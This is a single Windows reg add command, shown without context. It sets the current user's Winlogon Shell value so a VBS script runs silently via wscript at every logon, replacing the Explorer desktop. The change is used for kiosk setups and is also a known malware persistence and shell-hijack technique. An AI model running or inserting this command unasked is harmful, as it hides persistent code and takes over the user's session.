reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" ^
  /v Shell /t REG_SZ /d "wscript.exe //B //Nologo ""C:\launcher\bootstrapper.vbs""" /f
